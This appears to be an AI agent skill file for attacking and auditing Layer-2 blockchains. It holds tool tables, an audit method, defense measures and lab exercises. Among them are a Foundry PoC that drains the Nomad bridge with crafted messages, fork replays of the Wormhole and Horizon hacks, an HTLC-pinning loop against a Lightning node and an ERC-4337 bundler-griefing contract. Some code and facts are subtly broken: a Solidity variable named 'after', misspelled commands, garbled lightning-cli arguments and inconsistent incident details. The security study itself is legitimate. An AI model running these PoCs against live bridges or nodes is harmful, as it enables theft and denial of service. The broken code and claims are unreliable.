---
name: blockchain-l2-attack
description: "Layer-2 blockchain attack — Lightning Network (BOLT, HTLC), Optimistic Rollups (Optimism/Arbitrum/Boba/Base), ZK Rollups (zkSync/StarkNet/Polygon zkEVM/Scroll/Linea), Polygon PoS, Gnosis sidechain, cross-chain bridges (Wormhole/Nomad/Ronin/Poly Network/Multichain/Horizon), state channels, ERC-4337 account abstraction, and DA layers (Celestia/EigenDA/Avail)."
origin: kali-claw
version: "0.2.0.2"
compatibility:
  - claude-code
  - claude-sonnet-4.5
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
metadata:
  domain: blockchain-l2-attack
  category: blockchain-l2
  tool_count: 13
  guide_count: 1
  mitre: "TA0006-Credential Access"
  keywords:
    - L2
    - rollup
    - bridge
    - Lightning Network
    - Optimism
    - Arbitrum
    - zkSync
    - cross-chain
    - sequencer
    - fraud-proof
    - HTLC
    - ERC-4337
    - Wormhole
    - Nomad
    - Ronin
  last_reviewed: "2026-07-26"
---




# Skill: Layer-2 Blockchain Attack

> **Supplementary Files**:
> - `payloads.md` — Command + exploit catalogue organized by L2 family (Lightning Network, Optimistic Rollups, ZK Rollups, Bridges, Account Abstraction, DA layers) — 60+ code blocks with Foundry/Hardhat/Brownie PoCs, Slither/Echidna harnesses, and replay attack templates for every major L2 incident class.
> - `test-cases.md` — 12 structured test cases (TC-L2-001 through TC-L2-012) across Static Analysis, Bridge Replay, Sequencer/Fraud-Proof Analysis, ZK Soundness, Lightning/HTLC, Account Abstraction, and DA Layer categories.
> - `guides/blockchain-l2-attack-playbook.md` — Comprehensive playbook: L2 architecture comparison table, bridge security taxonomy (lock-mint / burn-mint / liquidity / validator-based), real-world exploit deep-dives (Wormhole $326M, Nomad $190M, Ronin $625M, Poly Network $611M, Multichain $1.5B, Horizon $100M), audit methodology, and local lab setup (Foundry + Anvil + OP Bedrock devnet + Arbitrum Nitro dev node + bridge simulator).

## Summary

Layer-2 (L2) blockchain security skill domain covering everything *above* the L1 base layer: payment channels, Optimistic and ZK rollups, sidechains, cross-chain bridges, account abstraction, and data-availability layers.

**Tools**: Foundry (forge/cast/anvil/chisel), Hardhat, Brownie/Ape, Slither, Mythril, Manticore, Echidna, Etheno, web3.py/ethers.js, Tenderly, Forta, OpenZeppelin Defender, Revoke.cash/Etherscan tools

**Domain**: blockchain-l2

**MITRE ATT&CK**: TA0006-Credential Access (validator key compromise, sequencer key theft, multisig social engineering)

## Description

Audit, exploit, and harden protocols that live *above* L1 — payment channels, rollups, sidechains, bridges, account abstraction, and data-availability layers. L2 security is fundamentally different from L1 smart-contract auditing because the trust assumptions, the cryptographic primitives, and the attack surface all change.

The five things that make L2 security different from `blockchain-web3`:

1. **Off-chain components are now in scope.** An L1 audit stops at the contract bytecode. An L2 audit must also cover the sequencer, the prover, the validator set, the relayer, the bridge multisig, and the off-chain message-passing daemon. The 2022 Ronin bridge ($625M loss) was not a smart-contract bug — it was a 5-of-9 validator multisig socially engineered down to effectively 3-of-5. The contract was "correct."
2. **Cryptography that L1 takes for granted is now attack surface.** ZK rollups depend on sound zero-knowledge proof systems (PLONK, Halo2, STARK). A verifier bug or trusted-setup compromise breaks the entire chain. The 2022 Wormhole hack ($326M) was a signature verification bypass on Solana's `SignatureAccount` program — the contract correctly verified *an* Ed25519 signature, just not *the right one*.
3. **Liveness and censorship are first-class.** An Optimistic rollup's sequencer can censor any user by refusing to include their transaction, and can stall the entire chain by going offline. There is no L1 equivalent — L1 validators are decentralized by assumption. L2 sequencer centralization is a $1B+ outage risk.
4. **Bridges are the single most attacked primitive in all of crypto.** As of 2024, bridge hacks account for the majority of all stolen crypto value, totaling >$2.8B in known losses. Bridges concentrate funds (the contract holds TVL from *both* chains), inherit the weaker security model of the two chains they connect, and almost always have an off-chain signer component that is the actual weak link.
5. **Each L2 family has its own exploit class.** Optimistic rollups: fraud-proof gaming. ZK rollups: prover/verifier soundness. Polygon PoS: validator-set stake concentration. Lightning: channel jamming and HTLC pinning. Bridges: validator/signature multisig compromise plus message-replay. Account abstraction: Paymaster griefing and bundler front-running. Treating L2 as "just more EVM" misses every L2-specific bug.

### Differentiation from `blockchain-web3`

`blockchain-web3` covers **L1 EVM smart contracts**: Solidity basics, the EVM object format, reentrancy/integer-overflow/access-control bugs, DeFi economic attacks (flash loans, oracle manipulation, MEV), proxy patterns, and L1 wallet security.

`blockchain-l2-attack` covers **everything above L1**:

| Concern | `blockchain-web3` (L1) | `blockchain-l2-attack` (L2) |
|---|---|---|
| Scope | Single EVM chain (Ethereum mainnet, BNB, Arbitrum as a *target*) | Off-chain + on-chain: rollup sequencers, provers, validators, bridge multisigs |
| Cryptography in scope | ECDSA, basic Merkle proofs | Ed25519 (Solana), BLS (validator sets), ZK proof systems (PLONK, Halo2, STARK), HTLC/PTLC, threshold signatures |
| Off-chain components | Out of scope (L1 node is trusted infrastructure) | In scope — sequencer, prover, validator daemon, relayer, indexer |
| Liveness / censorship | L1 liveness assumed | Critical attack surface — sequencer DoS, validator collusion, channel jamming |
| Token flow | Tokens stay on one chain | Tokens cross chains via lock-mint / burn-mint / liquidity — each with distinct failure modes |
| Notable incidents studied | The DAO (2016), bZx (2020), Cream (2021), Euler (2023) | Ronin ($625M), Poly Network ($611M), Wormhole ($326M), Nomad ($190M), Multichain ($1.5B), Horizon ($100M), Lightning channel pin attacks |
| Primary tooling | Slither, Mythril, Foundry on L1 contracts | Same tools PLUS bridge simulators, L2 node devnets (OP Bedrock, Arbitrum Nitro), c-lightning/LND harnesses, ZK circuit analyzers |

When in doubt: if the bug lives in a contract that runs on Ethereum L1 and could be replayed on any L1 EVM chain, it belongs in `blockchain-web3`. If the bug requires the sequencer, prover, validator set, bridge multisig, off-chain relayer, or L2-specific precompile, it belongs here.

**Difference from `crypto-attacks`**: Crypto-attacks covers the *algorithms* (RSA, ECC, AES, padding oracles, lattice). This skill covers *systems built on top of* those algorithms — bridge signature aggregation, rollup fraud proofs, ZK verifier contracts. The math is assumed sound; the wiring on top of it is not.

**Difference from `supply-chain-security`**: Supply-chain covers dependency provenance and CI/CD compromise. This skill covers a different kind of supply chain — the cross-chain message-passing pipeline where a single compromised relayer can mint unlimited tokens on the destination chain.

## Use Cases

- **Cross-chain bridge pre-deploy audit**: lock-mint/burn-mint wrapper review, validator-set membership changes, signature aggregation soundness, message-replay protection across chain IDs, and rate-limiting on the wrapper contract.
- **Bridge post-incident forensic replay**: given a drained bridge address and the exploit tx hash (Wormhole, Nomad, Ronin, Poly Network, Multichain, Horizon), reproduce the exploit on an anvil fork at the pre-incident block, identify the root cause, and write a regression test against the patched contract.
- **Optimistic rollup security review**: challenge-period analysis, fraud-proof soundness, sequencer centralization mapping, sequencer DoS surface, forced-inclusion mechanism review, and L1<->L2 message-passing replay protection.
- **ZK rollup soundness review**: verifier contract audit, trusted setup inspection (Powers of Tau ceremony), circuit-level review (Cairo, Circom, Halo2), prover DoS surface, and proof-replay protection across chains.
- **Lightning Network node pentest**: c-lightning / LND / Eclair configuration review, channel-jam attack surface, HTLC-pin DoS, onion-routing privacy analysis, and WatchTower / penalty-transaction review.
- **Polygon PoS validator review**: validator-set stake concentration, bor/heimdall node configuration, checkpoint verification on Ethereum L1, and the bridge contracts (Plasma -> PoS transition surface).
- **Sidechain audit (Gnosis Chain, Palm)**: POA validator set review, bridge multisig threshold analysis, native bridge contract audit, and exit-game soundness for any legacy Plasma components.
- **ERC-4337 account abstraction review**: Bundler mempool censorship analysis, Paymaster solvency and griefing vectors, factory-callee front-running on `createSender`, signature aggregation soundness, and storage-slot collision risk across smart accounts.
- **DA layer (Celestia/EigenDA/Avail) integration review**: blob-KZG proof verification, light-client fraud-proof review, sequencer sampling resistance (DAS), and the bridge contract that bonds DA-layer asserts back to a settlement chain.
- **Real-world exploit deep dive**: full chain-by-chain reconstruction of any of the $100M+ L2 hacks — useful for red-team training, post-mortem writing, and understanding what *actually* goes wrong.

## Core Tools

### L1 Forking + Rollup Node Devnets

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Anvil (Foundry)** | Local mainnet fork — required for bridge replay at a specific block | `anvil --fork-url $MAINNET_RPC --fork-block-number 14282107 --port 8545` |
| **OP Stack devnet (Bedrock)** | Local Optimism rollup — test sequencer, L1<->L2 message passing | `cd optimism && make devnet-up` |
| **Arbitrum Nitro dev node** | Local Arbitrum rollup — test sequencer, Nitro fraud-proof mechanics | `docker run -d -p 8547:8547 ghcr.io/offchainlabs/nitro-node-devnode` |
| **Foundry chisel** | Solidity REPL for interactive bridge storage inspection | `chisel` then `>>> cast_call("0xBridge", "nextNonce(address)", victim)` |
| **Cast** | RPC scripting for L1/L2 — read bridge state, decode events | `cast logs 0xBridge "Deposit(address,uint256,bytes32)" --rpc-url $L1_RPC --from-block 14282107` |

### Static + Symbolic Analysis (extends to bridge/rollup contracts)

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Slither** | Static analysis on L2 contracts — bridge wrappers, ERC-4337 entrypoint, rollup inbox/outbox | `slither src/Bridge.sol --detect reentrancy,arbitrary-send-eth,unchecked-transfer` |
| **Mythril** | Symbolic execution — finds signature-bypass, replay, and arithmetic bugs in bridge verifiers | `myth analyze src/WormholeBridge.sol --modules transaction_order_independence,ether_thief --max-depth 50` |
| **Manticore** | Symbolic execution over EVM bytecode — used to verify bridge signature aggregation soundness | `manticore src/MultichainRouter.sol` |

### Property Testing + Fuzzing

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Echidna** | Invariant fuzzer — define accounting invariants across bridge locks/mints | `echidna-test echidna/BridgeEchidna.sol --contract BridgeEchidna --test-mode property --test-limit 100000` |
| **Foundry invariant tests** | Built-in invariant testing across bridge lock/mint/burn flows | `forge test --invariant-test --match-contract BridgeInvariantTest` |

### Dynamic Frameworks + RPC Scripting

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Foundry (forge/cast/anvil/chisel)** | Full Rust-based toolkit — testing, RPC calls, local chain, REPL | `forge test -vvv --fork-url $L1_RPC --fork-block-number 14282107` |
| **Hardhat** | JS/TS framework — popular for L2 project test suites | `npx hardhat test --network localhost` |
| **Brownie / Ape** | Python frameworks — bridge scripts, replay harnesses | `ape test --network ::foundry:` or `brownie run scripts/bridge_poc.py` |
| **Etheno** | Multiplexing RPC — record a mainnet tx sequence, replay against a local node | `etheno --athena --rpc-port 8546 --record bridge_drain.jsonl` |

### Monitoring + Incident Response

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Tenderly** | Tx simulation + monitoring — simulate a bridge drain before it lands, alert on anomalous mints | `tenderly simulate --rpc-url $RPC --block 14282107 <tx-data>` |
| **Forta Network** | Real-time detection bots — alert on bridge anomalies (mint-without-lock, validator set change) | Deploy a Forta bot from `forta-network/agents/bridge-mint-monitor` |
| **OpenZeppelin Defender** | Automated incident response — pause a bridge via Sentinel when anomalous mint detected | Configure Sentinel in `defender/config.json` with `bridge-mint-pause` autotask |
| **Revoke.cash / Etherscan tools** | Approvals + tx decoder — useful for wallet-drain triage after a bridge incident | `cast 4byte-decode 0x42584e5f` (Wormhole `transferTokens` selector) |

## Methodology

### L2 Audit Seven-Phase Process

```
Phase 1           Phase 2           Phase 3           Phase 4           Phase 5           Phase 6           Phase 7
Threat Model   →  Component Map  →  Contract Audit →  Off-Chain Audit → Cross-Chain     →  Exploit PoC    →  Report +
(Scope, chain     (Bridge,           (Slither/Mythril/ (Sequencer,        Replay +         (Fork replay,      Defense
ID, trust         Sequencer,         Echidna on        Validator set,     Fuzz             Lab                Recs)
assumption)        Prover, Validator) bridge wrapper)   Relayer, Signer)  harness)         setup)
   │                 │                 │                 │                 │                 │                 │
   ▼                 ▼                 ▼                 ▼                 ▼                 ▼                 ▼
Lock-mint vs       Lock-up contract  Reentrancy,       Sequencer         Replay past       Wormhole/Nomad    Findings +
burn-mint vs       on source chain,  signature         censorship,       incidents on      PoC at exact      severity +
liquidity model    mint/burn/exit    aggregation       validator         anvil fork        pre-incident      defense-in-depth
Trust assumption   on destination,   soundness,        social-eng        block             block             recommendations
matrix             inbox/outbox      message-replay    surface,                                              for each
                   contracts         defense           prover DoS                                            component
```

**Phase 1 — Threat Model & Scope**

Before any tooling, document:
- Chain IDs in scope (L1, L2 source, L2 destination).
- Bridge type: lock-mint (tokens locked on source, minted on destination), burn-mint (tokens burned on source, minted on destination), liquidity (both sides hold tokens, off-chain relayer moves messages), validator-based (multisig signs messages).
- Trust assumption: who can mint unlimited tokens on the destination if compromised? Who can censor user exits on the source?
- Off-chain components in scope: sequencer, prover, validator set, relayer daemon, indexer.
- Authorization: scope rules, bug bounty terms, "no live mainnet attack" rule.

**Phase 2 — Component Map**

```bash
# Identify every address involved in the L2
# - L1 bridge contract (source side)
# - L2 bridge contract (destination side)
# - Sequencer address (Optimistic/ZK rollup)
# - Validator set addresses (Polygon PoS, Ronin)
# - Prover/Aggregator address (ZK rollup)
# - Relayer address (state channels, bridges)
# - Multisig signer set (off-chain admin)

# Enumerate via the protocol's docs + Etherscan labels
cast interface 0xBridgeL1 --rpc-url $L1_RPC > bridge_l1.abi
cast interface 0xBridgeL2 --rpc-url $L2_RPC > bridge_l2.abi
cat bridge_l1.abi | grep -E 'function (deposit|withdraw|finalize|mint|burn|escape|prove)'
```

**Phase 3 — Contract Audit (same as L1, but bridge-aware)**

```bash
# Standard Slither + Mythril + Echidna pass on every contract in the L2 surface
slither src/bridge/ --filter-paths "lib|test|mocks"
myth analyze src/bridge/L1Bridge.sol --modules transaction_order_independence,ether_thief --max-depth 50
myth analyze src/bridge/L2Bridge.sol --modules arbitrary_send_eth,suicide --max-depth 50

# Bridge-specific: verify the lock-mint accounting invariant in Echidna
echidna-test echidna/BridgeLockMintEchidna.sol --contract BridgeLockMintEchidna --test-mode property
```

**Phase 4 — Off-Chain Audit**

This is where L2 audits diverge from L1. Map and review:
- **Sequencer** (Optimistic/ZK rollup): Who operates it? Can it censor? What's the forced-inclusion escape hatch (L1 `enqueue` on OP Stack, L1 `sendL2Message` on Arbitrum)? Can a single sequencer key compromise mint authority?
- **Validator set** (Polygon PoS, Ronin, Horizon): What's the threshold (M-of-N)? What's the stake distribution? Can a social-engineering attack reduce effective threshold?
- **Prover / Aggregator** (ZK rollups): Who runs the prover? Is the trusted-setup ceremony transcript published? Is the verifier contract matched to the trusted-setup SRS?
- **Relayer daemon** (Wormhole, Multichain): Where does it run? Does it have access to validator keys? Is the daemon host hardened?

**Phase 5 — Cross-Chain Replay**

```bash
# Replay a past incident on a fork at the pre-incident block
anvil --fork-url $L1_RPC --fork-block-number 14282107 --port 8545 &  # pre-Wormhole hack
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount 0xAttacker
cast send --rpc-url http://localhost:8545 --from 0xAttacker --unlocked 0xBridge <exploit-calldata>
# Verify same loss occurred
cast balance 0xAttacker --rpc-url http://localhost:8545
```

**Phase 6 — Exploit PoC on Local Lab**

```bash
# Run the exploit as a forge test against the fork
forge test --match-test test_PoC_WormholePostMessageBypass -vvvv \
  --fork-url $L1_RPC \
  --fork-block-number 14282107 2>&1 | tee evidence/wormhole_poc.log
```

**Phase 7 — Report + Defense Recommendations**

For every finding, document:
- Affected component (contract, sequencer, validator set, prover).
- Trust assumption violated (e.g., "5-of-9 multisig reduced to effective 3-of-5 via social engineering").
- Exploitability under realistic conditions (gas cost, mempool visibility, MEV).
- Defense recommendation (rate limit, timelock, increase threshold, add WatchTower, switch to ZK proof).

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| Bridge pre-deploy audit | Slither + Echidna on bridge wrapper + off-chain validator set threat model | Mythril signature-aggregation verification |
| Replay Wormhole-style hack | `anvil --fork-block-number 14282107` + forge PoC | Tenderly simulation |
| Replay Nomad-style hack | `anvil --fork-block-number 15259350` + forge PoC (indiscriminate-call bug) | Direct cast replay |
| Optimistic rollup sequencer audit | Bedrock devnet + forced-inclusion test | Tenderly fork |
| ZK rollup verifier audit | Slither on verifier + manual soundness review of circuit | Certora Prover on verifier |
| Lightning Network channel review | c-lightning regtest harness + HTLC-pin PoC | LND sim-network mode |
| ERC-4337 entrypoint audit | Slither on EntryPoint + invariant tests on bundler griefing | Echidna on factory-callee front-running |
| Polygon PoS validator review | Stake concentration analysis + Heimdall checkpoint audit | Manual review of bor consensus |
| DA layer integration review | KZG proof verification review + DAS sampling resistance test | Celestia light-client audit |
| Multisig signer set review | Manual + on-chain threshold diff | Forta alerting on threshold changes |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Rate limiting on bridge mints** | Cap mintable-per-block to N% of total liquidity. Slows down an attacker even if a key is compromised, giving time to pause. |
| **Timelock on validator-set changes** | Any change to the validator set or multisig threshold must wait 24-48h on-chain. Lets users exit before a malicious threshold change takes effect. |
| **Multi-sig threshold > 50% + geographic distribution** | M-of-N where M > N/2, with signers distributed across legal jurisdictions and hardware security modules (HSMs). Resists both key theft and coercion. |
| **Sequencer failover + escape hatch** | L1 forced-inclusion mechanism (OP `enqueue`, Arbitrum `L2ToL1MessagePasser`) must work even when the sequencer is offline. Users can always exit via L1. |
| **ZK proof system audit + trusted setup** | Use a published, audited proving system (Halo2, PLONK). Publish the trusted-setup ceremony transcript. Use a universal SRS where possible (e.g., Aztec's ceremony). |
| **Fraud-proof window ≥ 7 days** | Optimistic rollup challenge windows must be long enough for honest watchers to catch and prove fraud. 7 days is the de-facto minimum. |
| **Bridge pausable + Sentinel** | Bridge should be pausable by a 2-of-3 multisig, with an automated Sentinel (OpenZeppelin Defender) that pauses on anomalous mint volume. |
| **WatchTower network** | For Lightning and state channels, a WatchTower service watches for old-state channel closes and broadcasts penalty transactions. Reduces need for 24/7 node liveness. |
| **Per-chain message-replay protection** | Every cross-chain message must commit to (source chain ID, destination chain ID, sequence number). Reject replays from a different chain ID. |
| **Account abstraction bundler decentralization** | Bundlers must be a competitive, decentralized network — not a single operator. Otherwise the bundler can censor any UserOperation. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Replay the 2022 Wormhole Hack on a Fork

Goal: reproduce the Wormhole $326M exploit on a local anvil fork at the pre-incident block.

```bash
# Wormhole hack: Solana mainnet block ~130889732, Ethereum block ~14282107
# The bug: postMessage() on the Wormhole bridge verified a VAA (Verified Action Approval)
# signature without checking that the signer was the registered Guardian set.
# An attacker faked a Guardian signature and minted 120,000 wETH on Solana.

# Fork at the pre-incident block
anvil --fork-url $MAINNET_RPC --fork-block-number 14282107 --port 8545 &
sleep 2

# Impersonate the attacker EOA
ATTACKER=0x629e7Da20197a5429d70DA521639708c5a6d8242
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount $ATTACKER
cast rpc --rpc-url http://localhost:8545 anvil_setBalance $ATTACKER 0x1000000000000000000

# Decode the exploit calldata
cast tx 0x629e7Da20197a5429d70DA521639708c5a6d8242 --rpc-url http://localhost:8545
# Look for: postMessage call with a fake VAA
```

### Exercise 2: Foundry PoC of the Nomad Indiscriminate-Call Bug

Goal: write a forge test that demonstrates how the 2022 Nomad hack let *any* address drain the bridge by replaying a single calldata pattern.

```solidity
// test/NomadPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface INomadBridge {
    function process(bytes memory _message) external;
}

contract NomadPoC is Test {
    INomadBridge bridge = INomadBridge(0x88A69B4E698A4B090DF6CF5A7bE7d7D3Caf0cE44);

    function test_PoC_NomadIndiscriminateProcess() public {
        // Fork at block 15259350 (immediately before the exploit)
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 15259350);

        // Build a message with: recipient = address(this), amount = 1 ether
        // The bug: any properly-formatted message was treated as valid
        bytes memory message = _craftMessage(address(this), 1 ether);

        uint256 before = address(this).balance;
        bridge.process(message);
        uint256 after = address(this).balance;

        assertGt(after, before, "funds received from indiscriminate process()");
    }

    function _craftMessage(address to, uint256 amount) internal pure returns (bytes memory) {
        // Nomad message format: 32B version, 32B nonce, 32B origin, 32B sender, 32B destination, 32B recipient, 32B amount, ...
        return abi.encodePacked(
            bytes32(uint256(0)),  // version
            bytes32(uint256(0)),  // nonce
            bytes32(uint256(0)),  // origin domain
            bytes32(uint256(0)),  // sender
            bytes32(uint256(0)),  // destination domain
            bytes32(uint256(uint160(to))),  // recipient
            bytes32(amount)  // amount
        );
    }
}
```

```bash
MAINNET_RPC=$ALCHEMY_RPC forge test --match-test test_PoC_NomadIndiscriminateProcess -vvvv \
  --fork-url $ALCHEMY_RPC --fork-block-number 15259350
```

### Exercise 3: Slither Pass on a Bridge Contract

Goal: run a bridge-specific Slither pass focused on the failure modes that have actually drained bridges.

```bash
# Targeted detector set for bridges
slither src/bridge/ \
  --detect reentrancy,reentrancy-eth,reentrancy-no-eth,reentrancy-unlimited-gas, \
arbitrary-send-eth,unchecked-transfer,arbitrary-send-erc20,controlled-delegatecall, \
tx-origin,timestamp,dangerous-strict-equality,assembly,suicidal,centralized-risk

# Bridge-specific: check signature verification patterns
# The detector `tx-origin` catches `require(msg.sender == tx.origin)` which is unsafe in L2 context
# (a contract wallet can never call the bridge). Use EIP-2771 meta-transaction pattern instead.

# Output for downstream triage
slither src/bridge/ --json slither_bridge.json
jq '.results.detectors[] | select(.impact=="High" or .impact=="Medium") | {check, impact, first_slot}' slither_bridge.json
```

### Exercise 4: Echidna Bridge Accounting Invariant

Goal: define and test the lock-mint invariant — every mint on the destination chain must correspond to a lock on the source chain.

```solidity
// echidna/BridgeLockMintEchidna.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/bridge/L1Bridge.sol";
import "../src/bridge/L2Bridge.sol";

contract BridgeLockMintEchidna {
    L1Bridge public l1;
    L2Bridge public l2;

    constructor() {
        l1 = new L1Bridge();
        l2 = new L2Bridge();
        l1.setPeer(address(l2));
        l2.setPeer(address(l1));
    }

    // INVARIANT: total minted on L2 <= total locked on L1
    function echidna_mint_never_exceeds_lock() public view returns (bool) {
        return l2.totalMinted() <= l1.totalLocked();
    }

    // INVARIANT: each deposit's hash is unique (no replay)
    function echidra_no_deposit_replay(uint256 amount, uint256 nonce) public {
        l1.deposit{value: amount}(address(this), bytes32(nonce));
        // Second deposit with the same nonce must revert
        (bool ok,) = address(l1).call(abi.encodeWithSelector(l1.deposit.selector, address(this), bytes32(nonce)));
        // ok should be false for the second call
        assert(!ok);
    }

    receive() external payable {}
}
```

```bash
echidna-test echidna/BridgeLockMintEchidna.sol \
  --contract BridgeLockMintEchidna \
  --test-mode property \
  --test-limit 50000 \
  --seq-len 5 \
  --workers 4
```

### Exercise 5: Lightning Network HTLC Pin Attack (Regtest Lab)

Goal: demonstrate the HTLC-pin DoS that cripples Lightning routing nodes by keeping HTLCs pending until expiry.

```bash
# Install c-lightning + Lightning Network Daemon (LND)
sudo apt install -y lightningd lightnin-cli
# Or use the official docker images:
docker pull elementsproject/lightningd
docker pull lightninglabs/lnd

# Start a regtest cluster (3 nodes: A, B, C, with A<->B and B<->C channels)
# Use Polar Lightning (polar.nintondo.io) for a GUI lab, or the polar-CLI:
docker run -d -p 8081:8081 polarlightning/polar:1.0.0

# Open a channel A -> B (B is the routing victim)
lightning-cli --network=regtest --lightning-dir=/tmp/l1 fundchannel 0222..(B_pubkey) 1000000

# From A, attempt many HTLCs to C through B, each with a tiny amount and a long expiry
# Each HTLC ties up B's capital until the CLTV expiry
for i in $(seq 1 100); do
  lightning-cli --lightning-dir=/tmp/l1 pay 0333..(C_invoice) 1sat 0.001sat 1000 0333..(C_pubkey)
done
# B is now pinned: capital locked in 100 pending HTLCs, no new HTLCs can be forwarded
```

### Exercise 6: ERC-4337 Bundler Griefing PoC

Goal: demonstrate that a malicious UserOperation can DoS a bundler by forcing a revert mid-bundle.

```solidity
// test/ERC4337GriefPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "@account-abstraction/contracts/interfaces/IEntryPoint.sol";

contract GriefingAttacker {
    IEntryPoint public entryPoint;

    constructor(address _ep) { entryPoint = IEntryPoint(_ep); }

    function craftMaliciousOp() internal view returns (UserOperation memory) {
        // The UserOperation's callData targets a function that reverts ONLY when
        // called in the context of a bundle (e.g., checks `msg.sender == entryPoint` and bundle size > 1)
        return UserOperation({
            sender: address(this),
            nonce: 0,
            initCode: "",
            callData: abi.encodeWithSelector(this.bundleReverter.selector),
            callGasLimit: 100000,
            verificationGasLimit: 100000,
            preVerificationGas: 21000,
            maxFeePerGas: 100 gwei,
            maxPriorityFeePerGas: 1 gwei,
            paymasterAndData: "",
            signature: ""
        });
    }

    // This function reverts ONLY when called as part of a bundle
    function bundleReverter() external {
        if (msg.sender == address(entryPoint)) {
            // Detect bundle context by inspecting entryPoint state
            // (e.g., whether other ops are in the same handleOps call)
            assembly { revert(0, 0) }
        }
    }
}
```

### Exercise 7: Polygon PoS Validator Stake Concentration Analysis

Goal: identify whether the Polygon validator set has reached effective centralization.

```bash
# Pull the current validator set from the stake manager
cast call 0x5e3Ef299fDDf15eAa483AE762359C841972A5eC2 "getCurrentValidatorSet()" \
  --rpc-url $MAINNET_RPC | cast --decode '(address[],uint256[])'

# Compute the Nakamoto coefficient: minimum number of validators that
# together control > 33% of total stake (enough to halt checkpoints)
python3 scripts/polygon_nakamoto.py --rpc $MAINNET_RPC --threshold 0.33
# Expected output: "Nakamoto coefficient (33%): N validators"
# If N <= 5, the chain is effectively centralized.
```

### Exercise 8: OP Stack Bedrock Devnet (Sequencer Failure Test)

Goal: stand up a local OP Stack devnet, kill the sequencer, verify the L1 forced-inclusion escape hatch still works.

```bash
# Clone the OP Stack monorepo
git clone https://github.com/ethereum-optimism/optimism
cd optimism
make install

# Bring up the devnet (L1 geth + L2 rollup node + L2 geth + deployer)
make devnet-up
# Wait ~30s for setup to complete

# Verify L2 is producing blocks
cast block-number --rpc-url http://localhost:9545

# Send a normal tx (goes through the sequencer)
cast send --rpc-url http://localhost:9545 \
  --private-key $DEV_PRIVATE_KEY \
  0xDead 1ether

# Now kill the sequencer
docker stop op-devnet-sequencer

# Send a forced-inclusion tx via L1 (should still work)
cast send --rpc-url http://localhost:8545 \
  --private-key $DEV_PRIVATE_KEY \
  0xDepositFeed \
  "depositTransaction(address,uint256,uint256,bool,bytes)" \
  0xDead 1ether 100000 false "0x"
# The L2 node should pick this up via the L1 → L2 deposit feed, bypassing the sequencer
```

### Exercise 9: zkSync Era Verifier Audit

Goal: audit the zkSync Era verifier contract for soundness against a fake proof.

```bash
# Pull the verifier contract address (zkSync Era Diamond Proxy)
cast call 0x32400084C286CF3E17e7B677ea9583e60a000324 "getVerifier()" \
  --rpc-url $ZKSYNC_RPC

# Slither pass focused on the verifier
slither src/Verifier.sol --detect dangerous-strict-equality,arithmetic,assembly

# Use Foundry's fuzzing to throw random "proof" bytes at the verifier
forge test --match-test testFuzz_VerifierRejectsRandomProof -vvv \
  --fork-url $ZKSYNC_RPC
```

### Exercise 10: Multichain (Anyswap) MPC Validator Compromise Simulation

Goal: simulate the threshold-signature compromise that led to the 2023 Multichain incident ($1.5B+ loss).

```bash
# Multichain used an MPC (multi-party computation) threshold signer with a small set of signers
# The 2023 incident: the MPC key custodians were socially engineered / coerced in China
# Attackers got control of the threshold signer and minted unlimited tokens on destination chains

# Lab: simulate the same with a local Gnosis Safe + threshold signer
docker run -d -p 9000:9000 gnosispm/safe-relay-service
# Configure a 3-of-5 threshold signer
# Demonstrate: compromising 3 of 5 signers yields full mint authority
# Defense: distribute signers across jurisdictions + HSMs + geographically diverse data centers
```

### Exercise 11: Horizon Bridge Validator Set Replay

Goal: reproduce the 2022 Horizon (Harmony) bridge hack ($100M) by exploiting the 2-of-5 validator multisig.

```bash
# Horizon used a 2-of-5 multisig for bridge confirmation
# The attack: 2 of the 5 validator keys were compromised (likely via private-key leak)
# Compromised validators signed arbitrary mint messages

# Fork at pre-incident block on Harmony mainnet (block ~19743149)
anvil --fork-url $HARMONY_RPC --fork-block-number 19743149 --port 8545 &

# Demonstrate that 2 signatures can mint arbitrary tokens
forge test --match-test test_PoC_HorizonTwoOfFiveBypass -vvvv \
  --fork-url http://localhost:8545 \
  --fork-block-number 19743149
```

### Exercise 12: Audit Report Writing (Bridge Finding)

Goal: turn a bridge finding into a structured report row.

```markdown
### [CRITICAL] Bridge mint authority relies on 2-of-5 multisig without timelock

**Severity**: CRITICAL
**Component**: Off-chain validator set + L2 mint function (0xL2Bridge)
**Location**: src/bridge/L2Bridge.sol:84 (`mint`), validator config `validators.json`

**Description**:
The destination-chain `mint` function trusts any message co-signed by 2 of 5
validator addresses. The validator addresses are static EOA keys held by
5 individuals, without an on-chain timelock on validator-set changes and without
HSM-backed key storage. A 2-of-5 threshold is below the 50% mark (M <= N/2),
meaning collusion or compromise of 2 individuals is sufficient to mint unlimited
tokens on the destination chain.

**Impact**:
Total loss of bridge TVL. This is the same configuration as the 2022 Horizon
bridge hack ($100M loss) and similar to the 2022 Ronin bridge hack ($625M loss,
where effective threshold was reduced to 5-of-9 then socially engineered).

**Proof of Concept**:
`test/HorizonStylePoC.t.sol::test_PoC_TwoOfFiveMintBypass` — forges two validator
signatures on a fake mint message and asserts the L2 bridge mints tokens.

**Recommendation**:
1. Raise threshold to M-of-N where M > N/2 (e.g., 4-of-5 or 7-of-9).
2. Move validator keys to HSMs (AWS CloudHSM, YubiHSM, or dedicated hardware).
3. Distribute signers across legal jurisdictions and operators.
4. Add a 24-48h on-chain timelock on validator-set changes.
5. Add rate limiting on mints (max N% of TVL per block).
6. Add a WatchTower / Sentinel that pauses the bridge on anomalous mint volume.
```

## Safety Notes

